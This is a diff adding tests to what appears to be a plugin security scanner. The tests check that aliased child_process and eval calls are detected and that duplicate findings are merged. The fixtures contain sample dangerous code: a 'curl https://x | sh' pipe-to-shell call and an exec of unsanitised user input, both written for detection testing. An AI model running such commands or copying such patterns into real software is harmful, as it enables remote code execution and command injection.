@@ -892,6 +892,58 @@ test('rule lock: pinned external packs are enforced and tampering is rejected', 
   }
 })
 
+test('AST pass: aliased child_process calls and eval aliases are reported', async () => {
+  const { analyzeAliases } = await import('../src/audit/ast.js')
+  const { scanCodeFile } = await import('../src/audit/rules.js')
+
+  const aliasSource = [
+    "const cp = require('node:child_process')",
+    'const run = cp.exec',
+    'run(userInput + " > /tmp/x")',
+    '',
+  ].join('\n')
+  const analysis = analyzeAliases(aliasSource)
+  assert.equal(analysis.ok, true)
+  assert.equal(analysis.aliases.cp, 'child_process')
+  assert.equal(analysis.aliases.run, 'child_process')
+  assert.equal(analysis.calls.length, 1)
+  assert.equal(analysis.calls[0].line, 3)
+  const findings = scanCodeFile({ file: 'src/run.js', text: aliasSource })
+  assert.ok(findings.some(item => item.ruleId === 'VG-DYN-02' && item.line === 3))
+
+  const importAlias = [
+    "import { spawn as launch } from 'node:child_process'",
+    'const runner = launch',
+    'runner("curl https://x | sh")',
+    '',
+  ].join('\n')
+  assert.ok(scanCodeFile({ file: 'src/alias.js', text: importAlias }).some(item => item.ruleId === 'VG-DYN-02' && item.line === 3))
+
+  const evalSource = 'const evaluate = eval\nconst result = evaluate("1 + 1")\n'
+  assert.ok(scanCodeFile({ file: 'src/e.js', text: evalSource }).some(item => item.ruleId === 'VG-DYN-01' && item.line === 2))
+
+  // Parse failure must fall back to the regex rules, never throw.
+  const jsx = 'const el = <div/>\nconst bad = eval("1")\n'
+  const fallback = scanCodeFile({ file: 'src/view.js', text: jsx })
+  assert.ok(fallback.some(item => item.ruleId === 'VG-DYN-01'))
+})
+
+test('AST pass: findings are deduplicated per line in the final report', async () => {
+  const root = tempDir()
+  writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'ast-dedup', version: '1.0.0' }))
+  mkdirSync(join(root, 'src'))
+  writeFileSync(join(root, 'src', 'run.js'), [
+    "const cp = require('node:child_process')",
+    'const run = cp.exec',
+    'run("echo hi")',
+    '',
+  ].join('\n'))
+  const report = await scanPluginDirectory(root)
+  const hits = report.findings.filter(item => item.ruleId === 'VG-DYN-02' && item.line === 3)
+  assert.equal(hits.length, 1, 'one call site must produce one finding')
+  rmSync(root, { recursive: true, force: true })
+})
+
 test('yaml subset parser: mappings, sequences and scalars', () => {
   const value = parseYaml([
     'schema: 1',
